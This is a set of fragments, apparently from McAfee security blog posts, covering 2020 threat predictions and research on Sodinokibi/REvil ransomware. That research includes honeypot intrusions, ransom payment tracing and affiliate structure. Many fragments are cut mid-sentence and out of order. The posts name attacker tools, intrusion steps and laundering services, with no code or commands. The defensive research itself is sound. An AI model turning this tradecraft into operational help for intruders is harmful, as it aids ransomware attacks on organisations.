 From a technical perspective, consumers have many tools at their disposal, even when security concerns do manifest. Implement a strong password policy, put IoT devices on their own, separate, network, utilize dual-factor authentication when possible, minimize redundant systems and patch quickly when issues are found.
:\/:
Consumers should ensure they are aware of the security risks associated with products available on the market.
:\/:
 Product manufacturers can help by clearly stating the level of security their product provides in comparison with the technology or component they seek to advance.
:\/:
 Threat actors are constantly tracking flaws which they can weaponize; conversely, threat researchers are constantly working to uncover and secure product vulnerabilities. By partnering with researchers and responding quickly, vendors have a unique opportunity
:\/:
With 2019’s headlines of ransomware, malware, and RDP attacks almost behind us, we shift our focus to the cybercrime threats ahead. Cybercriminals are increasing the complexity and volume of their attacks and campaigns, always looking for ways to stay one step ahead of cybersecurity practices – and more often using the world’s evolving technology against us.
:\/:
Continuing advancements in artificial intelligence and machine learning have led to invaluable technological gains, but threat actors are also learning to leverage AI and ML in increasingly sinister ways. AI technology has extended the capabilities of producing convincing deepfake video to a less-skilled class of threat actor attempting to manipulate individual and public opinion. AI-driven facial recognition, a growing security asset, is also being used to produce deepfake media capable of fooling humans and machines.
:\/:
Our researchers also foresee more threat actors targeting corporate networks to exfiltrate corporate information in two-stage ransomware campaigns.
:\/:
With more and more enterprises adopting cloud services to accelerate their business and promote collaboration, the need for cloud security is greater than ever. As a result, the number of organizations prioritizing the adoption container technologies will likely continue to increase in 2020. Which products will they rely on to help reduce container-related risk and accelerate DevSecOps?
:\/:
The increased adoption of robotic process automation and the growing importance to secure system accounts used for automation raises security concerns tied to Application Programming Interface (API) and their wealth of personal data.
:\/:
Application Programming Interfaces (API) Will be Exposed as The Weakest Link Leading to Cloud-Native Threats
:\/:
DevSecOps Will Rise to Prominence as Growth in Containerized Workloads Causes Security Controls to ‘Shift Left’
:\/:
The ability to create manipulated content is not new. Manipulated images were used as far back as World War II in campaigns designed to make people believe things that weren’t true. What’s changed with the advances in artificial intelligence is you can now build a very convincing deepfake without being an expert in technology. There are websites set up where you can upload a video and receive in return, a deepfake video. There are very compelling capabilities in the public domain that can deliver both deepfake audio and video abilities to hundreds of thousands of potential threats actors with the skills to create persuasive phony content.
:\/:
Deepfake video or text can be weaponized to enhance information warfare. Freely available video of public comments can be used to train a machine-learning model that can develop a deepfake video depicting one person’s words coming out of another’s mouth. Attackers can now create automated, targeted content to increase the probability that an individual or groups fall for a campaign. In this way, AI and machine learning can be combined to create massive chaos.
:\/:
In general, adversaries are going to use the best technology to accomplish their goals, so if we think about nation-state actors attempting to manipulate an election, using deepfake video to manipulate an audience makes a lot of sense. Adversaries will try to create wedges and divides in society, or if a cybercriminal can have a CEO make what appears to be a compelling statement that a company missed earnings or that there’s a fatal flaw in a product that’s going to require a massive recall. Such a video can be distributed to manipulate a stock price or enable other financial crimes
:\/:
We predict the ability of an untrained class to create deepfakes will enhance an increase in quantity of misinformation.
:\/:
Computer-based facial recognition, in its earliest forms, has been around since the mid-1960s. While dramatic changes have since taken place, the underlying concept remains: it provides a means for a computer to identify or verify a face. There are many use cases for the technology, most related to authentication and to answer a single question: is this person who they claim to be?
:\/:
As time moves onwards, the pace of technology has brought increased processing power, memory and storage to facial recognition technology. New products have leveraged facial recognition in innovative ways to simplify everyday life, from unlocking smart phones, to passport ID verification in airports, and even as a law enforcement aid to identify criminals on the street.
:\/:
One of the most prevalent enhancements to facial recognition is the advancement of artificial intelligence (AI). A recent manifestation of this is deepfakes, an AI-driven technique producing extremely realistic text, images, and videos that are difficult for humans to discern real from fake. Primarily used for the spread of misinformation, the technology leverages capabilities. Generative Adversarial Networks (GANs), a recent analytic technology, that on the downside, can create fake but incredibly realistic images, text, and videos. Enhanced computers can rapidly process numerous biometrics of a face, and mathematically build or classify human features, among many other applications. While the technical benefits are impressive, underlying flaws inherent in all types of models represent a rapidly growing threat, which cyber criminals will look to exploit.
:\/:
As technologies are adopted over the coming years, a very viable threat vector will emerge, and we predict adversaries will begin to generate deepfakes to bypass facial recognition. It will be critical for businesses to understand the security risks presented by facial recognition and other biometric systems and invest in educating themselves of the risks as well as hardening critical systems.
:\/:
, we predicted cyber criminals would partner more closely to boost threats; over the course of the year, we observed exactly that. Ransomware groups used 
:\/:
, or used remote desktop protocol (RDP) as an initial launch point for their campaign. These types of attacks required collaboration between groups. This partnership drove efficient, targeted attacks which increased profitability and caused more economic damage. In fact,  Europol’s 
:\/:
 (IOCTA),  named ransomware the top threat that companies, consumers, and the public sector faced in 2019.
:\/:
Based on what McAfee Advanced Threat Research (ATR) is seeing in the underground, we expect criminals to exploit their extortion victims even more moving forward. The rise of targeted ransomware created a growing demand for compromised corporate networks. This demand is met by criminals who specialize in penetrating corporate networks and sell complete network access in one-go.
:\/:
For 2020, we predict the targeted penetration of corporate networks will continue to grow and ultimately give way to two-stage extortion attacks. In the first stage cybercriminals will deliver a crippling ransomware attack, extorting victims to get their files back. In the second stage criminals will target the recovering ransomware victims again with an extortion attack, but this time they will threaten to disclose the sensitive data stolen before the ransomware attack.
:\/:
 installed before an actual ransomware attack took place. For 2020, we predict that cybercriminals will increasingly exfiltrate sensitive corporate information prior to a targeted ransomware attack to sell the stolen data online or to extort the victim and increase monetization.
:\/:
Application Programming Interfaces (API) Will Be Exposed as The Weakest Link Leading to Cloud-Native Threats
:\/:
 showed that more than three in four organizations treat API security differently than web app security, indicating API security readiness lags behind other aspects of application security. The study also showed that more than two-thirds of organizations expose APIs to the public to enable partners and external developers to tap into their software platforms and app ecosystems.
:\/:
APIs are an essential tool in today’s app ecosystem including cloud environments, IoT, microservices, mobile, and Web-based customer-client communications. Dependence on APIs will further accelerate with a growing ecosystem of cloud applications built as reusable components for back-office automation (such as with Robotic Process Automation) and growth in the ecosystem of applications that leverage APIs of cloud services such as Office 365 and Salesforce.
:\/:
Threat actors are following the growing number of organizations using API-enabled apps because APIs continue to be an easy – and vulnerable – means to access a treasure trove of sensitive data. Despite the fallout of large-scale breaches and ongoing threats, APIs often still reside outside of the application security infrastructure and are ignored by security processes and teams. Vulnerabilities will continue to include broken authorization and authentication functions, excessive data exposure, and a failure to focus on rate limiting and resource limiting attacks. Insecure consumption-based APIs without strict rate limits are among the most vulnerable.
:\/:
Headlines reporting API-based breaches will continue into 2020, affecting high-profile apps in social media, peer-to-peer, messaging, financial processes, and others, adding to the hundreds of millions of transactions and user profiles that have been scraped in the past two years. The increasing need and hurried pace of organizations adopting APIs for their applications in 2020 will expose API security as the weakest link leading to cloud-native threats, putting user privacy and data at risk until security strategies mature.
:\/:
Organizations seeking improvement in their API security strategy should pursue a more complete understanding of their Cloud Service APIs through comprehensive discovery across SaaS, PaaS and IaaS environments, implement policy-based authorization, and explore User and Entity Behavior Analytics (UEBA) technology to detect anomalous access patterns.
:\/:
DevSecOps Will Rise to Prominence as Growth in Containerized Workloads Causes Security Controls to ‘Shift Left’
:\/:
DevOps teams can continuously roll out micro-services and interacting, reusable components as applications. As a result, the number of organizations prioritizing the adoption of container technologies will continue to increase in 2020. 
:\/:
 that “by 2022, more than 75 percent of global organizations will be running containerized applications in production – a significant increase from fewer than 30 percent today.”
:\/:
 Container technologies will help organizations modernize legacy applications and create new cloud-native applications that are scalable and agile.
:\/:
Containerized applications are built by assembling reusable components on software defined Infrastructure-as-Code (IaC) which is deployed into Cloud environments. Continuous Integration / Continuous Deployment (CI/CD) tools automate the build and deploy process of these applications and IaC, creating a challenge for pre-emptive and continuous detection of application vulnerabilities and IaC configuration errors. To adjust to the rise in containerized applications operating in a CI/CD model, security teams will need to conduct their risk assessment at the time of code build, before deployment. This effectively shifts security “left” in the deployment lifecycle and integrates security into the DevOps process, a model frequently referred to as DevSecOps.
:\/:
Additionally, threats to containerized applications are introduced nor only by IaC misconfigurations or application vulnerabilities, but also abused network privileges which allow lateral movement in an attack. To address these run-time threats, organizations are increasingly turning to cloud-native security tools developed specifically for container environments. 
:\/:
 (CWPP) work as traffic enforcers for network micro-segmentation based on the identity of the application, regardless of its IP. This approach to application identity-based enforcement will push organizations away from the five-tuple approach to network security which is increasingly irrelevant in the context of ephemeral container deployments.
:\/:
When CASB and CWPP solutions integrate with CI/CD tools, security teams can meet the speed of DevOps, shifting security “left” and creating a DevSecOps practice within their organization.  Governance, compliance, and overall security of cloud environments will improve as organizations accelerate their transition to DevSecOps with these cloud-native security tools.

Gartner Best Practices for Running Containers and Kubernetes in Production, Arun Chandrasekaran, 25 February 2019
:\/:
This is the final installment of the McAfee Advanced Threat Research (ATR) analysis of Sodinokibi and its connections to GandGrab, the most prolific Ransomware-as-a-Service (RaaS) Campaign of 2018 and mid 2019. 
:\/:
In this final episode of our series we will zoom in on the operations, techniques and tools used by different affiliate groups spreading Sodinokibi ransomware.
:\/:
Compromising RDP and usage of script files and password cracking tools to distribute over the victim’s network
:\/:
Compromise of Managed Service Providers and usage of their distribution software to spread the ransomware
:\/:
To understand more about how this enemy operates, we in McAfee Advanced Threat Research (ATR) decided to operate a global network of honeypots. We were aware of the lively 
:\/:
 of RDP credentials and were curious about what someone would do with a compromised machine. Would they distribute the Sodinokibi ransomware? Would they execute the DejaBlue or BlueKeep exploits? Our specially designed and built RDP honeypots would give us those insights.
:\/:
From June until September 2019, we observed several groups compromise our honey pots and conduct activities related to Sodinokibi; we were able to fully monitor attackers and their actions without their knowledge.
:\/:
It is important to note the golden rule we operated under: the moment criminal actions were prepared or about to be executed, the actor would be disconnected and the machine would be restored to its original settings with a new IP address.
:\/:
We noticed some of our honeypot RDP servers were attacked by Persian-speaking actors that were actively harvesting credentials. Our analysis of these attacks led us to various Persian underground channels offering the same tools we observed appearing in Sodinokibi intrusions. Some of these tools are closed source and custom made, originating from within the channels in our analysis.
:\/:
McAfee ATR observed initial activity against our South American honey pot begin in late May 2019. We had full visibility as the actor loaded a number of tools, including Sodinokibi, during the initial intrusion period.
:\/:
, 2019. The actor utilized Masscan and NLBrute to scan and target other assets over RDP which fits with the behavior we have seen in all other Sodinokibi intrusions tracked by McAfee ATR. The actor then created a user account ‘backup’ and proceeded to consistently connect from an IP address range in Belgrade, Serbia.
:\/:
The following Sodinokibi variant appeared in our South American honey pot with the original file name of H.a.n.n.a.exe.
:\/:
Upon initial intrusion, the actor created several user accounts on the target system between June 10
:\/:
.  The malware Sodinokibi and credential-harvesting tool Mimikatz were executed under the user account “ibm” that the actor created as part of the entry into the system
:\/:
Further information revealed that the actor was connecting from two IP addresses in Poland and Finland via the ‘ibm’ account. These logins originated from these countries in a 24hr period between July 10
:\/:
 with the following two unique machine names WIN-S5N2M6EGS5J and TS11. Machine name WIN-S5N2M6EGS5J was observed to be used by another actor that created the account “asp” and originated from the same Polish IP address.
:\/:
The actor deployed a variant of the Mimikatz credential harvester during the intrusion, with the following custom BAT file:
:\/:
We have seen a consistent usage of various custom files used to interact with hacking tools that are shared among the underground communities.
:\/:
Another tool, known as Everything.exe, was also executed during the same period. This tool was used to index the entire file system and what was on the target system. This tool is not considered malicious and was developed by a legitimate company but can be used for profiling purposes. The usage of reconnaissance tools to profile the machine is interesting as it indicates potential manual lateral movement attempts by the actor on the target system.
:\/:
Activity observed during this period utilized tools similar to those used in other intrusions we have observed in multiple regions, including those by Affiliate ID 34.
:\/:
In this activity McAfee ATR identified NLBrute being executed again to target victims over RDP; a pattern we have seen over and over again in intrusions involving Sodinokibi.  A series of logins from Iran were observed between July 25
:\/:
We have also seen crypto currency mining apps deployed in most of the intrusions involving Sodinokibi, which may suggest some interesting side activity for these groups. In this incident we discovered a miner gate configuration file with a Gmail address.
:\/:
Using Open-Source Intelligence (OSINT) investigation techniques, we identified an individual that is most likely tied to the discovered Gmail address. Based on our analysis, this individual is likely part of some Persian-speaking credential cracking crew harvesting RDP credentials and other types of data. The individual is sharing information related to Masscan and Kport scan results for specific countries that can be used for brute force operations.
:\/:
Further, we observed this actor on a Telegram channel discussing operations which align to the behavior we observed during intrusions on our honey pot. The data shared appears to be results from tools such as Masscan or Kport-scan that would be used to compromise further assets.
:\/:
We observed the following Sodinokibi ransom variants attributed to this affiliate appearing in the honey pot in the Middle East. The attacker downloaded a file, ابزار کرک.zip, which can be mostly found in Farsi language private channels. The tool is basically a VPS Checker (really an RDP cracker) as discussed on the channels in the underground.
:\/:
 indicates that the attacker present on the system was conducting operations involving the Sodinokibi ransomware. When linking back activity, we observed one notable tool the actor had used during the operation.
:\/:
‘Hidden-User.bat’ was designed to create hidden users on the target system. This tool links back to some underground distribution on Farsi-speaking private channels.
:\/:
The file being shared is identical to the one we found to be used actively in the Sodinokibi case in different instances in June 2019, in different cities in the Middle East. We found the following Farsi-speaking users sharing and discussing this tool specifically (Cryptor007 and MR Amir), and others active in these groups. McAfee ATR observed this tool being used on June 13
:\/:
We observed the actor dropping one of the above-mentioned variants of Sodinokibi. In this case, the login came from an IP address originating in Iran and with a machine with a female Persian name.
:\/:
The attackers connecting are most likely Farsi-speaking, as is evident by the browsing history uncovered by McAfee ATR, which indicates where a number of the tools utilized originate from, including Farsi language file sharing sites, such as Picofile.com and Soft98.ir, that contain malicious tools such as NLBrute, etc.
:\/:
We observed the actor attempting to run an RDP brute force attack using NLBrute downloaded from the Iranian site Picofile.com. The target was several network blocks in Oman and the United Arab Emirates in the Middle East.
:\/:
In our analysis we discovered an offer to install ransomware on servers posted in Farsi speaking on August 19
:\/:
. This posting date corresponds with the timing of attacks observed in the Middle East. The services mentioned are specifically targeting servers that have been obtained via RDP credential theft campaigns. It is possible that these actors are coming in after the fact and installing ransomware on behalf of the main organizer, according to actor chatter. One specific Farsi language message indicates these services for a list of countries where they could install ransomware for the potential client.
:\/:
The operators responsible for intrusions involving Sodinokibi variants with an unknown affiliate ID utilize a variety of methods:
:\/:
The operators responsible for intrusions involving Sodinokibi variants with PID 34 utilize a variety of methods:
:\/:
Some of the operators appear write in Farsi and are originating from Iranian IP address space when connecting to observed targets
:\/:
The operators responsible for intrusions involving Sodinokibi variants with PID 19 utilize a variety of methods:
:\/:
Usage of Neshta to scan internal network shares within an organization in an effort to spread Sodinokibi
:\/:
Some of the operators appear to write in Farsi and are originating from Iranian IP address space when connecting to observed targets
:\/:
In our blog series about Sodinokibi we began by analyzing the code we asked ourselves the question, “Why Persian?” With the information retrieved from our honeypot investigations, it might give us a hypothesis that the Persian language is present due to the involvement of Persian-speaking affiliates. Time and evidence will tell.
:\/:
We observed many affiliates using different sets of tools and skills to gain profit and, across the series, we highlighted different aspects of this massive ongoing operation.
:\/:
To protect your organization against Sodinokibi, make sure your defense is layered. As demonstrated, the actors we are facing either buy, brute-force or spear-phish themselves into your company or use a trusted-third party that has access to your network. Some 
:\/:
 for organizations to protect themselves include employing sandboxing, backing up data, educating their users, and restricting access.
:\/:
As long as we support the ransomware model, ransomware will exist as it has for the last four years. We cannot fight alone against ransomware and have to unite as public and private parties. McAfee is one of the founding partners of NoMoreRansom.org and are supporting Law Enforcement agencies around the globe in fighting ransomware.
:\/:
This is the third installment of the McAfee Advanced Threat Research (ATR) analysis of Sodinokibi and its connections to GandCrab, the most prolific Ransomware-as-a-Service (RaaS) Campaign of 2018 and mid 2019. 
:\/:
The Talking Heads once sang “We’re on a road to nowhere.” This expresses how challenging it can be when one investigates the financial trails behind a RaaS scheme with many affiliates, etc.
:\/:
However, we persisted, and we prevailed. By linking underground forum posts with bitcoin transfer traces, we were able to uncover new information on the size of the campaign and associated revenue; even getting detailed insights into what the affiliates do with their earnings following a successful attack.
:\/:
With the Sodinokibi ransomware a unique BTC wallet is generated for each victim. As long as no payment is made, no trace of the BTC wallet will be available on the blockchain. The blockchain operates as a public ledger of all bitcoin transactions that have happened. When no currencies are exchanged, no transactions are recorded. Although many victims hit the news, we understand that if they paid, sharing that with the research community is maybe a bridge too far. On one of the underground forums we discovered the following post:
:\/:
In this post the actors are expanding their successful activity and offering a 60 percent cut as a start and, after three successful payments by the affiliate (read successful ransomware infections and payments received from the victims), the cut increases to 70 percent of the payments received. This is very common as we saw in the past with RaaS schemes like GandCrab and Cryptowall.
:\/:
Responding to this post is an actor with the moniker of ‘Lalartu’ and his comments are quite interesting, hinting he was involved with GandCrab. As a site-note: “Lalartu’ means ‘ghost/phantom’. Its origins are from the Sumerian civilization where Lalartu was seen as a vampiric demon.
:\/:
Researching the moniker of ‘Lalartu’ through our data, we went back in time a month or so and discovered a posting from the actor on June 4
:\/:
We observe here a couple of transaction IDs (TXID) on the bitcoin ledger, however they are incomplete. More than a week later, on June 17
:\/:
In this posting we see a screenshot with partial TXIDs and the amounts. With the help of the Chainalysis software and team, we were able to retrieve the full TXIDs. With that list we were able to investigate the transactions and start mapping them out with their software:
:\/:
From the various samples we have researched, the amounts asked for payment are between 0.44 and 0.45 BTC, an average of 4,000 USD.
:\/:
In the above screenshot we see the transactions where some of these amounts are transferred from a wallet, or bitcoins are bought at an exchange and transferred to the wallets associated with the affiliate(s).
:\/:
Based on the list shared by Lalartu in his post, and the average value of bitcoin around the dates, within 72 hours a value of 287,499.00 USD of ransom had been transferred.
:\/:
Taking the list of transactions as a starting point in our graph-analysis, we colored the lines red and started from there to investigate the wallets involved and interesting transactions:
:\/:
Although it might look like spaghetti, once you dive in, very interesting patterns can be discovered. We see victims paying to their assigned wallets; from there it takes an average of two to three transactions before it goes to an ‘affiliate’ or ‘distribution’ wallet. From that wallet we see the split happening as the moniker ‘UNKN’ mentioned in his forum post we started this article with. The 60 or 70 percent stays with the affiliate and the remaining 40/30 percent is forwarded in multiple transactions towards the actors behind Sodinokibi.
:\/:
Once we identified a couple of these transactions, we started to dig in both directions. What is the affiliate doing with the money and where is the money going for the Sodinokibi actors?
:\/:
We picked one promising affiliate wallet and started to dig deeper down and followed the transactions. As described above, the affiliate is getting money transferred mostly through an exchange (since this is being advised by the actors in the ransom note). This is what we see in the example below. Incoming ransomware payments via Coinbase.com are received. The affiliate seems to pay some fee to a service but also sends BTC into Bitmix.biz a popular underground bitcoin mixer that is obfuscating the next transactions to make it difficult to link the transactions back to the ‘final’ wallet or cash-out in a (crypto) currency.
:\/:
We also observed examples where the affiliates were paying for services, they bought on Hydra Market. Hydra Market is a Russian underground marketplace where many services and illegal products are offered with payment in BTC.
:\/:
Tracing down the route of splits, we started to search for the 30 or 40 percent cuts of the ransom payments of 0.27359811 BTC or, if the price was doubled, 0.54719622 BTC.
:\/:
Using the list of amounts and querying the transactions and transfers discovered, we observed a wallet that was receiving a lot of these smaller payments. Due to ongoing research we will not publish the wallet but here is a graph representation of a subset of transactions:
:\/:
It seems like a spider, but many incoming ‘split’ transfers, and only a few outgoing ones with larger amounts of bitcoins, were observed.
:\/:
If we take the average of $2,500 – $5,000 USD as a ransom ask, and the mentioned split of 30/40 percent for the actor maintaining the Sodinokibi ransomware and affiliate infrastructure, they make $700 – $1,500 USD per paid infection.
:\/:
We already saw in the beginning of this article that the affiliate Lalartu claimed to have made 287k USD in 72 hours, which is an 86k USD profit for the actor from one affiliate only.
:\/:
As far as we tracked the samples and extracted the amount of id-numbers, we counted over 41 affiliates being active. The data showed a in a relatively short amount of time the velocity and number of infections was high. Taken this velocity combined with a few payments per day, we can imagine that the actors behind Sodinokibi are making a fortune.
:\/:
Following the traces of one particular affiliate, we ended up seeing large amounts of bitcoins being transferred into a wallet which had a total value of 443 BTC, around 4,5 million USD with the average bitcoin price.
:\/:
We do understand that there are situations in which executives decide to pay the ransom but, by doing that, we keep this business model alive and also fund other criminal markets.
:\/:
In this blog we focused on insights into the financial streams behind ransomware. By linking underground forum posts with bitcoin transfer traces, we were able to uncover new information on the size of the campaign and associated revenue. In some cases, we were able even to get detailed insights into what the affiliates do with their earnings following a “successful” attack. It shows that paying ransomware is not only keeping the ‘ransom-model’ alive but is also supporting other forms of crime.
:\/:
In the next and final episode, “Crescendo” McAfee ATR reveals insights gleaned from a global network of honey pots.
:\/:
This is the second installment of the McAfee Advanced Threat Research (ATR) analysis of Sodinokibi and its connections to GandGrab, the most prolific Ransomware-as-a-Service (RaaS) Campaign of 2018 and mid-2019. 
:\/:
GandCrab announced its retirement at the end of May. Since then, a new RaaS family called Sodinokibi, aka REvil, took its place as one of the most prolific ransomware campaigns.
:\/:
 of our analysis on the Sodinokibi RaaS campaign we shared our extensive malware and post-infection analysis, which included code comparisons to GandCrab, and insight on exactly how massive the new Sodinokibi campaign is.
:\/:
The Sodinokibi campaigns are still ongoing and differ in execution due to the different affiliates spreading the ransomware. Which begs more questions to be answered, such as how do the affiliates operate? Is the affiliate model working? What can we learn about the campaign and possible connections to GandCrab by investigating the affiliates?
:\/:
It turns out, through large scale sample analysis and hardcoded value aggregation, we were able to determine which affiliates played a crucial role in the success of GandCrab’ criminal enterprise and found a lot of similarity between the RaaS enterprise of GandCrab and that of Sodinokibi.
:\/:
Before we begin with the Sodinokibi analysis and comparison we will briefly explain the methodology that we used for GandCrab.
:\/:
GandCrab was a prime example of a Ransomware-as-a-Service. RaaS follows a structure where the developers are offering their product to affiliates, partners or advertisers who are responsible for spreading the ransomware and generating infections. The developers take a percentage of the earned income and provide the other portion to the affiliates.
:\/:
: The malware author/s request a percentage per payment for use of the ransomware product. This way the developers have less risk than the affiliates spreading the malware. The developers can set certain targets for their affiliates regarding the amount of infections they need to produce. In a way, this is very similar to a modern sales organization in the corporate world.
:\/:
Subsequently, a RaaS model offers malware authors a safe haven when they operate from a country that does not regard developing malware as a crime. If their own nation’s citizens are not victimized, the developers are not going to be prosecuted.
:\/:
: As an affiliate you do not have to write the ransomware code yourself; less technical skill is involved. RaaS makes ransomware more accessible to a greater number of users. An affiliate just needs to be accepted in the criminal network and reach the targets set by the developers. As a service model it also offers a level of decentralization where each party sticks to their own area of expertise.
:\/:
Affiliates want to get paid proportionate to the infections they made; they expose themselves to a large amount of risk by spreading ransomware and they want to reap the benefits. Mutual trust between the developer and the affiliate plays a huge role in joining a RaaS system. It is very much like the expression: “Trust, hard to build, and easy to lose” and this largely explains the general skepticism that cybercriminal forum members display when a new RaaS system is announced.
:\/:
For the RaaS service to grow and maintain their trust, proper administration of infections/earnings per affiliate plays an important part. Through this, the developers can ensure that everyone gets an honest piece of the proverbial “pie”. So how can this administration be achieved? One way is having hardcoded values in the ransomware.
:\/:
Through our technical malware analysis, we established that, starting from version 4, GandCrab included certain hardcoded values in the ransomware source code:
:\/:
sub_id – The Sub ID of the affiliate ID; A tracking number for the affiliate for sub-renting infections or it tracks their own campaign, identifiable via the sub_id number.
:\/:
Version 4 had significant changes overall and we believe that these changes were partly done by the authors to improve administration and make GandCrab more scalable to cope with its increased popularity.
:\/:
Based on the hardcoded values it was possible for us, to a certain extent, to extract the administration information and create our own overview. We hunted for as many different GandCrab samples as we could find, using Yara rules, industry contacts and customer submissions. The sample list we gathered is quite extensive but not exhaustive. From the collected samples we extracted the hardcoded values and compile times automatically, using a custom build tool. We aggregated all these values together in one giant timeline from GandCrab version 4, all the way up to version 5.2.
:\/:
FIGURE 2. SMALL PORTION OF THE TIMELINE OF COLLECTED SAMPLES (NOTE THE FIRST FOUR POSSIBLY TIME STOMPED)
:\/:

The extracted ID’s and Sub_IDs showed a parent-child relationship, meaning every ID could have more than one SUB_ID (child) but every SUB_ID only had one ID (parent).
:\/:

Overall, we observed a gradual increment in the ID number over time. The earlier versions generally had lower ID numbers and higher ID numbers appeared with the later versions.
:\/:
However, there were relatively lower ID numbers that appeared in many versions, as shown in figure 3.
:\/:
This observation aligned with our theory that the ID number corresponds with a particular affiliate. Certain affiliates remained partners for a long period of time, spreading different versions of GandCrab; this explains the ID number appearing over a longer period and in different versions. This theory has also been acknowledged by several (anonymous) sources.
:\/:

When we applied the theory that the ID corresponded with an affiliate, we observed different activity amongst the affiliates. There are some affiliates/ID’s that were only linked to a single sample that we found. A reason for affiliates to only appear for a short moment can be explained by the failure to perform. The GandCrab developers had a strict policy of expelling affiliates that underperformed. Expelling an affiliate would open a new slot that would receive a new incremented ID number.
:\/:
, of which ID number 99 was by far the most active. We first observed ID 99 in six different samples of version 4.1.1, growing to 35 different samples in version 5.04. Based on our dataset we observed 71 unique unpacked samples linked to ID 99.
:\/:
Being involved with several versions (consistency over time), in combination with the number of unique samples (volume) and the number of infections (based on industry malware detections) can effectively show which affiliate was the most aggressive and possibly the most important to the RaaS network.
:\/:
An active affiliate can be compared to a top salesperson in any normal commercial organization. Given that the income of the RaaS network is largely dependent on the performance of its top affiliates, identifying and disrupting a top affiliate’s activity can have a crippling effect on the income of the RaaS network, internal morale and overall RaaS performance. This can be achieved through arrests of an affiliate and/or co-conspirers.
:\/:
Another way is disrupting the business model and lowering the ransomware’s profits through offering free decryption tools or building vaccines that prevent encryption. The disruption will increase the operational costs for the criminals, making the RaaS of less interest.
:\/:
Lastly, for any future proceedings (suspect apprehension and legal) it is important to maintain a chain of custody linking victims, samples and affiliates together. Security providers as gatherers and owners of this data play a huge role in safeguarding this for the future.
:\/:
Using an online tool from RAWGraphs we created a graphic display of the entire dataset showing the relationship between the versions and the ID numbers. Below is an overview, a more detailed overview can be found on the 
:\/:
Top performing affiliates immediately stood out from the rest as the lines were thicker and more spread out. According to our data, the most active ID numbers were 15,41,99 and 170. Determining the key players in a RaaS family can help Law Enforcement prioritize its valuable resources.
:\/:
At the time we were not realizing it fully but, looking back at the overview, it stands out that none of the top affiliates/ID numbers where present in the final version 5.2 of GandCrab which was released in February. We believe that this was an early indicator that the end of GandCrab was imminent.
:\/:
This discovery might indicate that some kind of event had taken place that resulted in the most active affiliates not being present. The cause could have been internal or external.
:\/:
But what puzzles us is why would a high performing affiliate leave? Maybe we will never hear the exact reason. Perhaps it is quite similar to why people leave regular jobs… feeling unhappy, a dispute or leaving for a better offer.
:\/:
Please note that active ID numbers 15,41,99 and170 from the complete overview are not present in any GandCrab version 5.2 infections. The most active affiliate in version 5.2. was nr 287.
:\/:
 we described the technical similarities we have seen between GandCrab and REvil. We are not the only ones that noticed these similarities – security reporter Brian Krebs published an 
:\/:
 where he highlights the similarities between GandCrab and a new ransomware named Sodinokibi or REvil, and certain postings that were made on several underground forums.
:\/:
 of July 2019, for a private ransomware as a service (RaaS) he had been running for some time. Below is a screenshot of the posting. Interesting is the response from a user with the nickname Lalartu. In a reply to the advertisement, Lalartu mentions that he is working with UNKN and his team, as well as that they had been a former GandCrab affiliate, something that was noticed by 
:\/:
 too. Lalartu’s post supports our earlier observations that some top GandCrab affiliates suddenly disappeared and might have moved to a different RaaS family. This is something that was suspected but never confirmed with technical evidence.
:\/:
We suspect that Lalartu is not the only GandCrab affiliate that has moved to Sodinokibi. If top affiliates have a solid and very profitable infection method available, then it does not make sense to retire with the developers.
:\/:
Around February 2019, there was a noticeable change in some of GandCrab’s infections behavior. Managed Service Providers (MSP) were now targeted through vulnerable systems and their customers got infected with GandCrab on a large scale, something we had not seen performed before by any of the affiliates. Interestingly, shortly after the retirement of GandCrab, the MSP modus operandi was quickly adopted by Sodinokibi, another indication that a former GandCrab affiliate had moved to Sodinokibi.
:\/:
This makes us suspect that Sodinokibi is actively recruiting the top performing affiliates from other successful RaaS families, creating a sort of all-star team.
:\/:
At the same time, the RaaS market is such where less proficient affiliates can hone their skills, improve their spreading capabilities and pivot to the more successful RaaS families. Combined with a climate where relatively few ransomware arrests are taking place, it allows for an alarming cybercriminal career path with dire consequences.
:\/:
Another similarity Sodinokibi shares with GandCrab is the administration of infections, one of the indicators of a RaaS’s growth potential. In our earlier blog we discussed that Sodinokibi generates a JSON config file for each sample containing certain values such as a PID number and a value labeled sub. So, we decided to use our GandCrab affiliate methodology on the Sodinokibi config files we were able to collect.
:\/:
With GandCrab we had to write our own tool to pull the hardcoded indicators but, with Sodinokibi, we were lucky enough that 
:\/:
 had developed a tool that did much of the heavy lifting for us. In the end there were still some samples from which we had to pull the configs manually. The JSON file contains different values and fields; for a comparison to GandCrab we focused on the PID and SUB field of each sample as these values appeared to have a similar characteristic as the ID and SUB_ID field in the GandCrab samples.
:\/:
With the data we gathered, we used the same analysis methodology on Sodinokibi  as we did on GandCrab. 
:\/:
 and with the Parent-Child relationship structure being nearly identical. Below we compared activity of GandCrab affiliate number 99 with the activity of the Sodinokibi affiliate number 19.
:\/:
It needs to be said that the timespan for the GandCrab overview was generated over a long period of time with a larger total of samples than the Sodinokibi overview.
:\/:
The activity of both ID numbers displays a tree-shaped structure with the parent ID number at the root and branching out to the respective SUB numbers linked to multiple samples.
:\/:
We believe that the activity above might be linked to a tiered affiliate group that is specialized in RDP brute forcing and infecting systems with Sodinokibi after each successful compromise.
:\/:
Both RaaS family structures are too large to effectively publish within the space of this blog. Our Complete overview for the Sodinokibi RaaS structure can be found on our 
:\/:
When we started our journey with GandCrab we did not expect it would take us so far down the rabbit hole. Mass sample analysis and searching for administration indicators provided a way to get more insight in a multi-million-dollar criminal enterprise, determine key players and foresee future events through changes in the business structure. We believe that the retirement of GandCrab was not an overnight decision and, based on the data on the affiliates, it was clear that something was going to happen.
:\/:
With the emergence of Sodinokibi and the few forum postings by a high profile former GandCrab affiliate, everything fell into place. We have strong indications that some of the top affiliates have found a new home with Sodinokibi to further their criminal business.
:\/:
Given that the income of the RaaS network is largely dependent on the performance of its top affiliates, and it is run like a normal business, we (the security industry) should not only research the products the criminals develop, but also identify possible ways to successfully disrupt the criminal business.
:\/:
In our next episode we dive deeper into the financial streams involved in the affiliate program and provide an estimate of how much money these actors are earning with the ransomware-as-a-service business model.
:\/:
McAfee’s Advanced Threat Research team (ATR) observed a new ransomware family in the wild, dubbed Sodinokibi (or REvil), at the end of April 2019. Around this same time, the GandCrab ransomware crew announced they would shut down their operations. Coincidence? Or is there more to the story?
:\/:
In this series of blogs, we share fresh analysis of Sodinokibi and its connections to GandCrab, with new insights gleaned exclusively from McAfee ATR’s in-depth and extensive research.
:\/:
In this first instalment we share our extensive malware and post-infection analysis and visualize exactly how big the Sodinokibi campaign is.
:\/:
